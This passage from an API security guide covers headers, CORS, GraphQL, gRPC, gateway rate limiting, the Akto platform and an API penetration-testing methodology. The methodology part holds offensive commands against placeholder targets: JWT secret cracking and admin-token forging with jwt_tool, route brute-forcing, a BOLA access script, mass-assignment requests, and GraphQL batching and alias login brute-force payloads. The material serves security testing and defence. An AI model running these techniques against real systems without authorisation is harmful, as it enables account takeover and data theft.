        response.headers["Content-Security-Policy"] = "default-src 'none'"
        response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
        response.headers["X-Request-ID"] = request.state.request_id
        # Remove information-leaking headers
        response.headers.pop("Server", None)
        response.headers.pop("X-Powered-By", None)
        return response
```

**CORS Policy for APIs:**
```python
# Express.js API CORS
const cors = require('cors');

const corsOptions = {
  origin: function(origin, callback) {
    const allowedOrigins = ['https://app.example.com', 'https://admin.example.com'];
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('CORS policy violation'));
    }
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Request-ID'],
  maxAge: 86400  // Cache preflight for 24 hours
};

app.use('/api/', cors(corsOptions));
```

---

## 4. GraphQL Security

### Introspection Risks

GraphQL's introspection system allows clients to query the schema itself — discovering all types, queries, mutations, and fields. In production, this capability is a reconnaissance goldmine for attackers.

```graphql
# Introspection query — reveals entire API schema
{
  __schema {
    types {
      name
      fields {
        name
        type { name kind }
        args { name type { name } }
      }
    }
  }
}
```

**Why introspection is dangerous in production:**
- Reveals all available queries, mutations, and subscriptions
- Exposes field names that may reveal sensitive business logic
- Allows automated attack tool generation (InQL, GraphQL Voyager)
- Shows deprecated fields (potential zombie API paths)

**Disabling introspection:**
```javascript
// Apollo Server
const server = new ApolloServer({
  typeDefs,
  resolvers,
  introspection: process.env.NODE_ENV === 'development',
  // Also disable field suggestions in production
  fieldResolverFallback: false,
});

// graphql-shield rule
const isIntrospectionAllowed = rule()(async (parent, args, ctx) => {
  return ctx.user?.role === 'admin';
});
```

**Note:** Even with introspection disabled, attackers can use field suggestion responses (GraphQL returns "Did you mean X?" for typos) to enumerate field names. Disable these too.

### Query Depth Limiting

Without depth limits, attackers can craft deeply nested queries that trigger exponential resolver execution:

```graphql
# DoS via deeply nested query
{
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            friends { id name email }
          }
        }
      }
    }
  }
}
```

```javascript
// graphql-depth-limit
const depthLimit = require('graphql-depth-limit');

const server = new ApolloServer({
  validationRules: [depthLimit(5)]  // Max 5 levels of nesting
});
```

### Query Complexity Analysis

Depth limiting alone is insufficient — a query can be shallow but wide, requesting thousands of fields:

```graphql
# Wide query — expensive even at depth 2
{
  users(limit: 10000) {
    id email name phone address paymentMethods transactions
  }
}
```

```javascript
// graphql-query-complexity
const { createComplexityLimitRule } = require('graphql-query-complexity');

const complexityRule = createComplexityLimitRule(1000, {
  scalarCost: 1,
  objectCost: 2,
  listFactor: 10,  // Lists multiply cost by 10
  introspectionListFactor: 2,
});

const server = new ApolloServer({
  validationRules: [complexityRule]
});
```

### Field-Level Authorization

GraphQL resolvers must enforce authorization at each field:

```javascript
// BAD: No field-level authorization
const resolvers = {
  Query: {
    user: (parent, { id }) => db.users.findById(id)
  }
}

// GOOD: Field-level authorization with graphql-shield
const { shield, rule, allow, deny } = require('graphql-shield');

const isAuthenticated = rule()(async (parent, args, ctx) => {
  return ctx.user !== null;
});

const isOwner = rule()(async (parent, args, ctx) => {
  return parent.id === ctx.user.id;
});

const permissions = shield({
  Query: {
    user: isAuthenticated,
    adminUsers: and(isAuthenticated, isAdmin),
  },
  User: {
    email: isOwner,      // Users can only see their own email
    ssn: deny,           // Never expose SSN via GraphQL
    paymentMethods: isOwner,
  }
});
```

### Batching Attacks and Rate Limit Bypass

GraphQL allows multiple operations in a single request via batching and aliases:

```graphql
# Batching attack — 1000 operations in 1 HTTP request
[
  {"query": "mutation { login(email: "user1@x.com", pass: "password1") { token } }"},
  {"query": "mutation { login(email: "user2@x.com", pass: "password2") { token } }"},
  ...999 more
]

# Alias attack — bypass rate limiting with aliases
{
  a1: login(email: "user1@x.com", pass: "pass1") { token }
  a2: login(email: "user2@x.com", pass: "pass2") { token }
  a3: login(email: "user3@x.com", pass: "pass3") { token }
  # Each alias is a separate resolver call but counts as 1 HTTP request
}
```

**Mitigations:**
```javascript
// Disable batching
const server = new ApolloServer({
  allowBatchedHttpRequests: false,
});

// Rate limit by GraphQL operation count, not HTTP request count
// Implement operation-level rate limiting in resolvers
```

### Persisted Queries

Persisted queries improve security by pre-registering allowed queries on the server:

```javascript
// Client registers query by hash
const QUERY_HASH = sha256(queryString);

// Request uses hash instead of full query
POST /graphql
{"extensions": {"persistedQuery": {"version": 1, "sha256Hash": "abc123..."}}}

// Server only executes registered queries
const persistedQueries = {
  "abc123...": "query GetUser($id: ID!) { user(id: $id) { name email } }"
};

if (!persistedQueries[req.body.extensions?.persistedQuery?.sha256Hash]) {
  return res.status(400).json({errors: [{message: "Query not registered"}]});
}
```

### GraphQL Security Tools

**GraphQL Voyager:** Visual schema explorer — converts introspection results into interactive graph diagram, ideal for understanding attack surface.

**graphql-cop:**
```bash
pip install graphql-cop
graphql-cop -t https://api.target.com/graphql
# Tests: introspection, field suggestions, batching, query depth, aliases
```

**InQL (Burp Suite Extension):**
- Generates GraphQL query templates from introspection
- Integrates with Burp Scanner for automated testing
- Supports custom authentication headers

**Altair GraphQL Client:**
- Open-source alternative to GraphQL Playground
- Supports auth headers, environments, query history
- Plugin system for security testing extensions

### Subscription Security

WebSocket-based GraphQL subscriptions have unique security concerns:

```javascript
// Validate auth on WebSocket upgrade (not just connection)
const server = new ApolloServer({
  subscriptions: {
    onConnect: (connectionParams) => {
      const token = connectionParams.Authorization;
      if (!validateToken(token)) {
        throw new Error('Unauthorized subscription');
      }
      return { user: decodeToken(token) };
    }
  }
});
```

---

## 5. gRPC Security

### Protobuf vs. JSON

gRPC uses Protocol Buffers (Protobuf) — a binary serialization format defined by `.proto` schema files. This provides structural advantages over JSON:

| Aspect | JSON | Protobuf/gRPC |
|--------|------|---------------|
| **Format** | Human-readable text | Binary (not human-readable) |
| **Schema** | Optional (OAS) | Mandatory (`.proto`) |
| **Type safety** | Loose | Strict |
| **Size** | Larger (verbose) | 3-10x smaller |
| **Speed** | Slower parsing | Faster parsing |
| **Security** | Schema-less = mass assignment risk | Schema enforces field types |

**`.proto` schema example:**
```protobuf
syntax = "proto3";
package user.v1;

service UserService {
  rpc GetUser(GetUserRequest) returns (GetUserResponse);
  rpc CreateUser(CreateUserRequest) returns (CreateUserResponse);
}

message GetUserRequest {
  int64 user_id = 1;
}

message GetUserResponse {
  int64 id = 1;
  string email = 2;
  string name = 3;
  // sensitive fields NOT included in response schema
}
```

### TLS for gRPC

All gRPC communication must use TLS. gRPC supports both one-way TLS (server cert) and mutual TLS (mTLS).

```python
# Python gRPC server with TLS
import grpc
from concurrent import futures

def serve():
    server = grpc.server(futures.ThreadPoolExecutor(max_workers=10))

    # Load TLS credentials
    with open('server.key', 'rb') as f:
        private_key = f.read()
    with open('server.crt', 'rb') as f:
        certificate_chain = f.read()
    with open('ca.crt', 'rb') as f:
        root_certificates = f.read()

    # One-way TLS (server cert only)
    server_credentials = grpc.ssl_server_credentials(
        [(private_key, certificate_chain)]
    )

    # mTLS (require client cert)
    mtls_credentials = grpc.ssl_server_credentials(
        [(private_key, certificate_chain)],
        root_certificates=root_certificates,
        require_client_auth=True  # Enforce client certificate
    )

    server.add_secure_port('[::]:50051', mtls_credentials)
    server.start()
    server.wait_for_termination()
```

```python
# gRPC client with mTLS
channel = grpc.secure_channel(
    'api.example.com:50051',
    grpc.ssl_channel_credentials(
        root_certificates=ca_cert,
        private_key=client_key,
        certificate_chain=client_cert
    )
)
```

### Authentication via Metadata

gRPC does not have HTTP headers — authentication tokens are passed via metadata:

```python
# Client: attach JWT token as gRPC metadata
import grpc

class AuthMetadataPlugin(grpc.AuthMetadataPlugin):
    def __init__(self, token):
        self.token = token

    def __call__(self, context, callback):
        callback([('authorization', f'Bearer {self.token}')], None)

# Create channel with auth metadata
channel_credential = grpc.ssl_channel_credentials(ca_cert)
call_credential = grpc.metadata_call_credentials(
    AuthMetadataPlugin(jwt_token),
    name='jwt'
)
composite_credentials = grpc.composite_channel_credentials(
    channel_credential,
    call_credential
)
channel = grpc.secure_channel('api.example.com:50051', composite_credentials)
```

### gRPC Interceptors for Authorization

```python
# Server-side authorization interceptor
class AuthInterceptor(grpc.ServerInterceptor):
    def intercept_service(self, continuation, handler_call_details):
        # Extract token from metadata
        metadata = dict(handler_call_details.invocation_metadata)
        token = metadata.get('authorization', '').replace('Bearer ', '')

        try:
            claims = validate_jwt(token)
            # Store claims in context for downstream use
        except InvalidTokenError:
            def abort(request, context):
                context.abort(grpc.StatusCode.UNAUTHENTICATED, 'Invalid token')
            return grpc.unary_unary_rpc_method_handler(abort)

        return continuation(handler_call_details)

server = grpc.server(
    futures.ThreadPoolExecutor(max_workers=10),
    interceptors=[AuthInterceptor()]
)
```

### gRPC Reflection — Disable in Production

gRPC reflection is the equivalent of GraphQL introspection — it exposes service definitions to any client:

```bash
# Attacker uses grpcurl to list services via reflection
grpcurl -plaintext api.target.com:50051 list
# → user.v1.UserService
# → payment.v1.PaymentService
# → admin.v1.AdminService  ← discovered without documentation

# Describe service methods
grpcurl -plaintext api.target.com:50051 describe user.v1.UserService
```

**Disabling reflection:**
```python
# Python: Only register reflection in development
from grpc_reflection.v1alpha import reflection

if os.environ.get('ENABLE_REFLECTION', 'false') == 'true':
    SERVICE_NAMES = (
        user_pb2.DESCRIPTOR.services_by_name['UserService'].full_name,
        reflection.SERVICE_NAME,
    )
    reflection.enable_server_reflection(SERVICE_NAMES, server)
```

### gRPC-Gateway REST Transcoding Security

gRPC-gateway translates HTTP/JSON requests to gRPC, allowing REST clients to call gRPC services. Security considerations:

- Validate that HTTP path parameters map correctly to Protobuf message fields
- Enforce HTTPS on the gateway HTTP layer (gRPC uses HTTP/2 with TLS, but gateway HTTP/1.1 must also enforce TLS)
- Apply rate limiting at the gateway HTTP layer
- The gRPC service itself should re-validate all fields regardless of the gateway layer

### Fuzz Testing gRPC

```bash
# Install protoc-gen-go-fuzz
go install github.com/AdamKorcz/go-fuzz-headers/...

# Custom gRPC fuzzer with protobuf mutations
# Use Atheris (Python fuzzing) or libFuzzer for C++ gRPC services
# Radamsa for mutation-based binary fuzzing of protobuf payloads

# Example: fuzz with invalid field values
python3 grpc_fuzzer.py --target api.example.com:50051   --service user.v1.UserService   --method GetUser   --proto user.proto
```

**Protobuf-specific fuzz targets:**
- Integer overflow in `int32`/`int64` fields
- Very long strings in `string` fields
- Deeply nested `message` types (parser recursion)
- Unknown field numbers (unknown fields in proto3)
- Malformed binary protobuf encoding

---

## 6. API Gateway Security

### Rate Limiting Algorithms

**Token Bucket:**
```
Capacity: 100 tokens
Refill rate: 10 tokens/second
Each request: consume 1 token
Burst: Yes (up to 100 requests instantly)
```
Best for: APIs that need to allow legitimate bursts (search, batch operations)

**Leaky Bucket:**
```
Queue capacity: 100 requests
Drain rate: 10 requests/second
Overflow: immediate 429 rejection
Burst: No (smoothed to constant rate)
```
Best for: Backend protection against thundering herd

**Sliding Window Counter:**
```python
import redis
from datetime import datetime

def check_rate_limit(user_id: str, limit: int = 100, window: int = 60) -> bool:
    r = redis.Redis()
    key = f"rate:{user_id}:{datetime.now().minute}"

    pipe = r.pipeline()
    pipe.incr(key)
    pipe.expire(key, window)
    result = pipe.execute()

    return result[0] <= limit
```

**Multi-Tier Rate Limiting:**
```yaml
# Kong rate limiting plugin configuration
plugins:
  - name: rate-limiting
    config:
      second: 10       # Per-second burst protection
      minute: 200      # Per-minute sustained limit
      hour: 5000       # Per-hour quota
      day: 50000       # Daily API quota
      policy: redis    # Shared state across gateway instances
      limit_by: consumer  # Per-authenticated-user

  - name: rate-limiting
    config:
      second: 5
      limit_by: ip     # Additional per-IP limit
```

### JWT Validation at Gateway

Validate JWTs at the gateway layer before requests reach backend services:

```yaml
# Kong JWT plugin
plugins:
  - name: jwt
    config:
      key_claim_name: kid
      claims_to_verify:
        - exp
        - nbf
      maximum_expiration: 3600  # Max 1 hour token lifetime
      anonymous: null  # Reject unauthenticated requests
```

**Token Revocation via Redis Blocklist:**
```python
import redis

r = redis.Redis()

def revoke_token(jti: str, expiry_seconds: int):
    # Add JWT ID to blocklist until token would naturally expire.
    r.setex(f"revoked:{jti}", expiry_seconds, "1")

def is_token_revoked(jti: str) -> bool:
    return r.exists(f"revoked:{jti}") > 0

# In JWT validation middleware
def validate_token(token: str):
    payload = decode_jwt(token)
    jti = payload.get('jti')

    if not jti:
        raise ValueError("Token missing jti claim")

    if is_token_revoked(jti):
        raise ValueError("Token has been revoked")

    return payload
```

### Payload Size Limits

```nginx
# Nginx: Global payload size limit for API
client_max_body_size 1m;

# Per-endpoint overrides
location /api/v1/upload {
    client_max_body_size 50m;  # File upload endpoint
}

location /api/v1/ {
    client_max_body_size 100k;  # All other API endpoints
}
```

### IP Allowlist/Blocklist

```python
# FastAPI IP filtering middleware
from fastapi import Request, HTTPException
from ipaddress import ip_address, ip_network

BLOCKED_RANGES = [
    ip_network("10.0.0.0/8"),    # Example: block specific internal range
]
ALLOWED_ADMIN_IPS = [
    ip_address("203.0.113.10"),  # Admin source IP
]

class IPFilterMiddleware:
    async def __call__(self, request: Request, call_next):
        client_ip = ip_address(request.client.host)

        # Admin endpoints: strict allowlist
        if request.url.path.startswith("/api/admin"):
            if client_ip not in ALLOWED_ADMIN_IPS:
                raise HTTPException(403, "Admin access restricted")

        # Global blocklist
        for blocked_range in BLOCKED_RANGES:
            if client_ip in blocked_range:
                raise HTTPException(403, "IP blocked")

        return await call_next(request)
```

### WAF Integration at API Gateway

Modern API-aware WAFs go beyond OWASP Core Rule Set (CRS) signature matching:

- **Positive security model:** Only allow requests matching the OpenAPI schema (block anything else)
- **JSON/XML parsing:** Inspect request bodies for injection patterns
- **API schema validation:** Reject requests with unexpected parameters or formats
- **Bot detection:** JavaScript challenges, TLS fingerprinting (JA3), behavioral analysis

```yaml
# AWS API Gateway + WAF integration
Resources:
  ApiGatewayWebACL:
    Type: AWS::WAFv2::WebACL
    Properties:
      Scope: REGIONAL
      DefaultAction:
        Allow: {}
      Rules:
        - Name: AWSManagedRulesCommonRuleSet
          Priority: 1
          OverrideAction:
            None: {}
          Statement:
            ManagedRuleGroupStatement:
              VendorName: AWS
              Name: AWSManagedRulesCommonRuleSet
        - Name: RateLimitRule
          Priority: 2
          Action:
            Block: {}
          Statement:
            RateBasedStatement:
              Limit: 2000
              AggregateKeyType: IP
          VisibilityConfig:
            CloudWatchMetricsEnabled: true
            MetricName: RateLimitRule
```

### Logging Best Practices

```python
# Structured API request logging
import structlog
import uuid

logger = structlog.get_logger()

class APILoggingMiddleware:
    async def __call__(self, request: Request, call_next):
        request_id = str(uuid.uuid4())
        start_time = time.time()

        response = await call_next(request)

        duration_ms = (time.time() - start_time) * 1000

        logger.info(
            "api_request",
            request_id=request_id,
            method=request.method,
            path=request.url.path,
            status_code=response.status_code,
            duration_ms=round(duration_ms, 2),
            user_id=getattr(request.state, 'user_id', None),
            client_ip=request.client.host,
            user_agent=request.headers.get('user-agent'),
            # NEVER log: Authorization headers, request bodies (may contain PII/secrets)
        )

        response.headers["X-Request-ID"] = request_id
        return response
```

### Gateway Configuration Examples

**Kong (open-source):**
```bash
# Install plugins
kubectl apply -f https://bit.ly/kong-ingress-controller

# Configure JWT + rate limiting via CRD
apiVersion: configuration.konghq.com/v1
kind: KongPlugin
metadata:
  name: jwt-auth
plugin: jwt
---
apiVersion: configuration.konghq.com/v1
kind: KongPlugin
metadata:
  name: rate-limiting
plugin: rate-limiting
config:
  minute: 100
  policy: redis
```

**AWS API Gateway:**
```python
# CDK: API Gateway with Lambda authorizer + throttling
api = apigateway.RestApi(self, "SecureApi",
    default_method_options=apigateway.MethodOptions(
        authorizer=lambda_authorizer,
        authorization_type=apigateway.AuthorizationType.CUSTOM,
    ),
    deploy_options=apigateway.StageOptions(
        throttling_rate_limit=1000,      # requests/second
        throttling_burst_limit=500,       # burst capacity
        access_log_destination=apigateway.LogGroupLogDestination(log_group),
        access_log_format=apigateway.AccessLogFormat.json_with_standard_fields(),
    )
)
```

**Azure API Management:**
```xml
<!-- APIM Policy: JWT validation + rate limiting -->
<policies>
  <inbound>
    <validate-jwt header-name="Authorization" failed-validation-httpcode="401">
      <openid-config url="https://login.microsoftonline.com/tenant/.well-known/openid-configuration"/>
      <required-claims>
        <claim name="aud"><value>api://my-api</value></claim>
      </required-claims>
    </validate-jwt>
    <rate-limit-by-key calls="100" renewal-period="60"
      counter-key="@(context.Request.Headers.GetValueOrDefault("Authorization",""))" />
  </inbound>
</policies>
```

---

## 7. Akto API Security Platform

### Overview

**Akto** (https://github.com/akto-api-security/akto) is an open-source API security testing platform that provides:

- **Automatic API discovery** from production traffic
- **Security posture assessment** with 150+ built-in test templates
- **CI/CD integration** for shift-left API security testing
- **Sensitive data detection** in API request/response traffic
- **Runtime API discovery** via eBPF kernel-level traffic capture

**Architecture:**
```
Traffic Sources → Akto Traffic Processor → API Inventory
                                        ↓
                              Security Test Engine
                                        ↓
                              Issue Tracker (Jira/Linear)
                                        ↓
                              CI/CD Pipeline Integration
```

### Automatic API Discovery

Akto discovers APIs by analyzing actual traffic rather than relying on documentation:

```bash
# Deploy Akto via Docker Compose
git clone https://github.com/akto-api-security/akto
cd akto
docker-compose up -d

# Configure traffic mirroring (AWS example)
# Mirror API Gateway traffic to Akto analyzer
aws ec2 create-traffic-mirror-session   --network-interface-id eni-xxx   --traffic-mirror-target-id tmt-yyy   --traffic-mirror-filter-id tmf-zzz
```

**Discovery Sources:**
- **AWS/GCP/Azure traffic mirroring:** Copy packets from production without impacting traffic
- **Nginx/HAProxy access logs:** Parse logs to reconstruct API inventory
- **Burp Suite integration:** Forward Burp proxy traffic to Akto
- **eBPF agents:** Kernel-level packet capture for any service without proxy insertion
- **OpenAPI import:** Seed inventory from existing API specs

### Security Test Templates

Akto's 150+ built-in test templates cover:

| Category | Test Examples |
|----------|---------------|
| **BOLA/IDOR** | Object ID substitution, horizontal privilege escalation |
| **Authentication bypass** | Remove auth header, expired token, malformed JWT |
| **Injection** | SQL injection in API params, XSS via API, command injection |
| **Rate limiting** | Send 500 requests/minute, test for 429 response |
| **Mass assignment** | Add `role`, `admin`, `is_staff` to update requests |
| **Sensitive data** | SSN, credit card, password in responses |
| **Security headers** | CORS, HSTS, CSP presence |
| **Broken object property** | Access fields beyond user's scope |

### CI/CD Integration

```yaml
# GitHub Actions: Akto API security scan in CI
name: API Security Scan
on: [push, pull_request]

jobs:
  akto-scan:
    runs-on: ubuntu-latest
    steps:
      - name: Run Akto API Security Tests
        uses: akto-api-security/run-scan@v1.0.5
        with:
          AKTO_DASHBOARD_URL: ${{ secrets.AKTO_DASHBOARD_URL }}
          AKTO_API_KEY: ${{ secrets.AKTO_API_KEY }}
          AKTO_TEST_IDS: "BOLA,BROKEN_AUTHENTICATION,MASS_ASSIGNMENT"
          START_TIME_DELAY: 180  # seconds to wait for app startup
```

```bash
# Jenkins pipeline integration
stage('API Security') {
    steps {
        sh '''
            curl -X POST "${AKTO_URL}/api/startTest"               -H "X-API-KEY: ${AKTO_API_KEY}"               -H "Content-Type: application/json"               -d '{"testingRunHexId": "${TEST_RUN_ID}", "startTimestamp": 0}'
        '''
    }
}
```

### Burp Suite Extension

Akto's Burp extension routes Burp proxy traffic to Akto for real-time API discovery during manual testing:

```
Burp Proxy → Akto Extension → Akto Dashboard
                            ↓
                     API Inventory Update
                            ↓
                     Automated Test Triggers
```

**Setup:**
1. Download `akto-burp-plugin.jar` from GitHub releases
2. Install in Burp: Extender → Extensions → Add → Select JAR
3. Configure Akto dashboard URL and API key in extension settings
4. All Burp proxy traffic automatically populates Akto API inventory

### Custom Test Creation

```python
# Akto custom test template (YAML format)
id: CUSTOM_ADMIN_ACCESS_TEST
info:
  name: Admin Endpoint Access Test
  description: Test if regular users can access admin endpoints
  severity: HIGH
  category: BROKEN_FUNCTION_LEVEL_AUTHORIZATION

auth:
  authenticated: true

execute:
  type: single
  requests:
    - req:
        - modify_url: /api/admin/users
        - modify_method: GET
        - remove_auth_header: false  # Keep regular user auth

validate:
  response_code:
    gte: 200
    lt: 300
  # If regular user gets 200 on admin endpoint → vulnerability
```

### Sensitive Data Detection

Akto scans API responses for PII and sensitive data patterns:

- **Credit card numbers** (Luhn algorithm validation)
- **Social Security Numbers** (XXX-XX-XXXX pattern)
- **JWT tokens** in responses (potential token leakage)
- **Private keys** (BEGIN RSA PRIVATE KEY)
- **AWS credentials** (AKIA... pattern)
- **Password fields** in API responses
- **Email addresses** in unexpected contexts
- **Phone numbers** (multiple international formats)

### Runtime Discovery via eBPF

```bash
# Deploy Akto eBPF agent for zero-overhead traffic capture
kubectl apply -f https://raw.githubusercontent.com/akto-api-security/akto/main/infra/akto-agent.yaml

# The eBPF agent:
# - Attaches to kernel network stack via BPF programs
# - Captures HTTP/gRPC traffic without proxy insertion
# - Zero performance impact on application pods
# - Works with encrypted traffic (captures after TLS termination)
# - Sends traffic metadata to Akto dashboard
```

---

## 8. API Penetration Testing

### Methodology Overview

```
Phase 1: DISCOVER      → Find API endpoints
Phase 2: ENUMERATE     → Map API surface, understand parameters
Phase 3: AUTHENTICATE  → Obtain valid tokens, understand auth flows
Phase 4: AUTHORIZE     → Test BOLA, BFLA, privilege escalation
Phase 5: FUZZ          → Test input validation, find injection points
Phase 6: BUSINESS LOGIC → Test rate limits, abuse flows, chaining
Phase 7: REPORT        → Document findings with PoC
```

### Phase 1: Discover — Find API Endpoints

**Google Dorks:**
```
site:target.com inurl:"/api/"
site:target.com inurl:"/v1/" OR inurl:"/v2/"
site:target.com filetype:json
site:target.com "swagger.json" OR "openapi.json"
"api.target.com" site:github.com  # Leaked API references
```

**Shodan/Censys:**
```bash
# Shodan: Find API servers for organization
shodan search 'org:"Target Corp" http.title:"API"'
shodan search 'ssl:"target.com" http.component:"swagger"'

# Censys: Certificate transparency → find all subdomains
censys search 'parsed.subject.common_name: "*.target.com"'
```

**JavaScript Source Analysis:**
```bash
# Extract API endpoints from minified JS bundles
# Using LinkFinder
python3 linkfinder.py -i https://app.target.com/static/app.bundle.js -o cli

# Using gf (tomnomnom) patterns
gf endpoints js_files.txt

# Browser: Extract all XHR/fetch calls
# Chrome DevTools → Network → Filter XHR/Fetch → Export HAR
```

**APK Analysis:**
```bash
# Decompile Android APK for hardcoded API endpoints
apktool d target-app.apk
grep -r "api\." target-app/smali/ | grep "https://"
grep -r "BuildConfig" target-app/smali/ | grep "URL"

# iOS IPA: similar approach with class-dump or objection
frida-ps -Ua  # List running apps on connected device
objection -g com.target.app explore
```

**DNS Enumeration:**
```bash
# Subfinder for subdomain discovery
subfinder -d target.com | grep -E "^api|^api-|^apis"

# Expected API subdomain patterns
api.target.com
api-v2.target.com
api.internal.target.com
staging-api.target.com
dev-api.target.com
```

### Phase 2: Enumerate — API Surface Mapping

**OpenAPI Spec Locations:**
```
/swagger.json
/swagger.yaml
/openapi.json
/openapi.yaml
/api-docs
/api/swagger.json
/v1/swagger.json
/v2/api-docs
/.well-known/openid-configuration  (OAuth/OIDC)
```

**kiterunner — API Route Brute Force:**
```bash
# Install kiterunner
go install github.com/assetnote/kiterunner@latest

# Brute-force API routes using curated wordlist
kr scan https://api.target.com -w ~/wordlists/routes-large.kite   -H "Authorization: Bearer $TOKEN"   --fail-status-codes 404,403   -x 10  # 10 concurrent workers

# Use OpenAPI spec wordlist generator
kr kb convert swagger.json -o swagger.kite
kr scan https://api.target.com -w swagger.kite
```

**Arjun — Parameter Discovery:**
```bash
# Discover hidden GET/POST parameters
arjun -u https://api.target.com/v1/search
arjun -u https://api.target.com/v1/users -m POST   -H "Authorization: Bearer $TOKEN"   --include "Content-Type: application/json"

# Arjun output: discovered params like ?admin=, ?debug=, ?internal=
```

**ffuf — Endpoint Fuzzing:**
```bash
# Fuzz API version numbers
ffuf -u https://api.target.com/FUZZ/users   -w versions.txt \  # v1, v2, v3, alpha, beta, internal
  -H "Authorization: Bearer $TOKEN"   -fc 404 -t 20

# Fuzz endpoint names
ffuf -u https://api.target.com/api/FUZZ   -w api_wordlist.txt   -H "Authorization: Bearer $TOKEN"   -mc 200,201,400,403,500 \  # Interesting status codes
  -fc 404 -t 50
```

### Phase 3: Authenticate — Token Analysis

**JWT Analysis:**
```bash
# Decode and analyze JWT without verification
jwt_tool eyJhbGc... -d  # Decode

# Check for none algorithm vulnerability
jwt_tool eyJhbGc... -X a

# Brute force weak HMAC secret
jwt_tool eyJhbGc... -C -d /usr/share/wordlists/rockyou.txt

# Test RS256 to HS256 confusion with public key
jwt_tool eyJhbGc... -X k -pk public.pem

# Forge token with modified claims
jwt_tool eyJhbGc... -T -S hs256 -p "crackedsecret"
# Modify {"role": "user"} → {"role": "admin"} in interactive editor
```

**API Key Discovery:**
```bash
# Check common API key locations
curl -i https://api.target.com/  # Headers: X-API-Key?
curl -I https://api.target.com/swagger.json  # API key in spec?

# Search GitHub for exposed keys
# Use truffleHog or gitleaks on cloned repositories
trufflehog github --org=targetcorp --only-verified
```

### Phase 4: Authorize — BOLA and BFLA Testing

**BOLA Testing Methodology:**
```python
# Automated BOLA testing script
import requests

BASE_URL = "https://api.target.com"
VICTIM_TOKEN = "Bearer victim_jwt_here"
ATTACKER_TOKEN = "Bearer attacker_jwt_here"

# Collect object IDs as victim
response = requests.get(f"{BASE_URL}/v1/orders",
    headers={"Authorization": VICTIM_TOKEN})
victim_order_ids = [o['id'] for o in response.json()['orders']]

# Attempt to access victim's resources as attacker
for order_id in victim_order_ids:
    r = requests.get(f"{BASE_URL}/v1/orders/{order_id}",
        headers={"Authorization": ATTACKER_TOKEN})
    if r.status_code == 200:
        print(f"BOLA FOUND: Order {order_id} accessible with attacker token")
        print(r.json())
```

**BFLA Testing:**
```bash
# Test HTTP methods on all discovered endpoints
for endpoint in $(cat endpoints.txt); do
  for method in GET POST PUT PATCH DELETE OPTIONS; do
    response=$(curl -s -o /dev/null -w "%{http_code}"       -X $method       -H "Authorization: Bearer $USER_TOKEN"       $endpoint)
    echo "$method $endpoint: $response"
  done
done | grep -v "404\|405"  # Show only interesting responses
```

### Phase 5: Fuzz — Input Validation Testing

**Burp Intruder for Mass Assignment:**
```
1. Capture API update request in Burp
2. Send to Intruder
3. Set payload position on request body fields
4. Payload list: admin, is_admin, role, balance, credit, permissions, is_staff, verified
5. Check which fields are accepted (200 response vs. ignored)
```

**wfuzz for Parameter Fuzzing:**
```bash
# Fuzz parameter values for injection
wfuzz -c -z file,/usr/share/wordlists/injection.txt   -H "Authorization: Bearer $TOKEN"   -H "Content-Type: application/json"   -d '{"user_id": "FUZZ"}'   --sc 200   https://api.target.com/v1/users/lookup
```

### Mass Assignment Testing Methodology

1. **Identify updatable endpoints:** `PUT /api/users/profile`, `PATCH /api/account`
2. **Get the object via GET** to see all field names in the response
3. **Add each field to the update request** (especially role, admin, permissions, balance)
4. **Check if extra fields are silently accepted** (200 OK with modified data) vs. rejected (400/422)
5. **Compare field values** before and after update request

```bash
# Step 1: Get current user object
curl -H "Authorization: Bearer $TOKEN" https://api.target.com/v1/user/profile
# Response: {"id": 42, "email": "test@example.com", "role": "user", "credits": 0}

# Step 2: Attempt mass assignment
curl -X PUT -H "Authorization: Bearer $TOKEN"   -H "Content-Type: application/json"   -d '{"email": "test@example.com", "role": "admin", "credits": 99999}'   https://api.target.com/v1/user/profile

# Step 3: Verify if role changed
curl -H "Authorization: Bearer $TOKEN" https://api.target.com/v1/user/profile
```

### GraphQL Attack Tooling

```bash
# graphql-cop: comprehensive GraphQL security audit
pip install graphql-cop
graphql-cop -t https://api.target.com/graphql -o json > graphql_results.json

# InQL standalone: generate attack queries from introspection
python3 inql.py -t https://api.target.com/graphql --generate-html

# Clairvoyance: field enumeration without introspection
python3 clairvoyance.py -t https://api.target.com/graphql   -w /usr/share/wordlists/graphql-fields.txt   -o schema.json

# Batch query DoS test
curl -X POST https://api.target.com/graphql   -H "Content-Type: application/json"   -d '[
    {"query": "{ user(id: 1) { id } }"},
    {"query": "{ user(id: 2) { id } }"},
    ... # 1000 items
  ]'
```

### OWASP Nettacker for API Scanning

```bash
# Install OWASP Nettacker
pip install nettacker

# Scan API for common vulnerabilities
nettacker -i api.target.com   -m all   -x port_scan \  # Exclude port scan for API testing
  -o results.json   -w 10  # workers

# Specific API modules
nettacker -i api.target.com   -m api_vuln,http_options,cors_vuln,jwt_weak   --timeout 10
```

---

## 9. API Security in CI/CD

### OpenAPI Spec Linting with Spectral

**Spectral** (by Stoplight) is a JSON/YAML linter for OpenAPI specs with security-focused rule sets.

```bash
# Install Spectral
npm install -g @stoplight/spectral-cli

# Run with OWASP API Security ruleset
spectral lint openapi.yaml --ruleset @stoplight/spectral-owasp-rules
```

**Custom security ruleset (`.spectral.yaml`):**
```yaml
extends: ["spectral:oas", "@stoplight/spectral-owasp-rules"]
rules:
  # Require authentication on all endpoints
  require-security-scheme:
    given: "$.paths[*][*]"
    message: "Every API operation must declare a security scheme"
    severity: error
    then:
      field: security
      function: truthy

  # Prevent 500 errors from exposing stack traces
  no-server-error-descriptions:
    given: "$.paths[*][*].responses['5XX']"
    message: "5XX responses should not include detailed error descriptions"
    severity: warn
    then:
      field: description
      function: pattern
      functionOptions:
        notMatch: "stack|trace|exception|debug"

  # Require rate limit documentation
  rate-limit-header:
    given: "$.paths[*][post,put,delete].responses[200]"
    message: "POST/PUT/DELETE responses should document rate limit headers"
    severity: info
    then:
      field: headers
      function: truthy
```

### 42Crunch API Security Audit

42Crunch provides deep OpenAPI spec security analysis beyond linting:

```bash
# VS Code extension: vscode-openapi
# Provides real-time security audit in editor

# CLI audit
npm install -g @42crunch/api-audit-cli
api-audit audit openapi.yaml --output results.json

# Checks performed:
# - Authentication requirements on all endpoints
# - Schema validation completeness (min/max, patterns)
